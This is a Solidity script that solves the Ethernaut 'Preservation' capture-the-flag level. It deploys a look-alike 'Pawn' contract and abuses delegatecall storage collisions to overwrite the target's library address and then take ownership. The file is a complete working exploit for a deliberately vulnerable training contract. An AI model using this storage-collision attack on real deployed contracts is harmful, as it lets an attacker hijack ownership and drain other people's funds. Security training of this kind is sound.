// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Preservation} from "../src/Preservation.sol";

/**
 *
 * Level address: 0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed
 * This contract utilizes a library to store two different times for two
 * different timezones. The constructor creates two instances of the library for
 * each time to be stored.
 *
 * The goal of this level is for you to claim ownership of the instance you are
 * given.
 *
 *   Things that might help
 *
 * Look into Solidity's documentation on the delegatecall low level function,
 * how it works, how it can be used to delegate operations to on-chain.
 * libraries, and what implications it has on execution scope.
 * Understanding what it means for delegatecall to be context-preserving.
 * Understanding how storage variables are stored and accessed.
 * Understanding how casting works between different data types.
 *
 */
contract Pawn {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract PreservationScript is Attacker {
    Level private level = Level(0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Preservation preservation = Preservation(instance);
        Pawn pawn = new Pawn();

        preservation.setSecondTime(uint256(uint160(address(pawn))));
        require(
            preservation.timeZone1Library() == address(pawn),
            "Failed to set address to pawn"
        );

        preservation.setFirstTime(uint256(uint160(me.addr)));

        require(preservation.owner() == me.addr, "Not owner");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
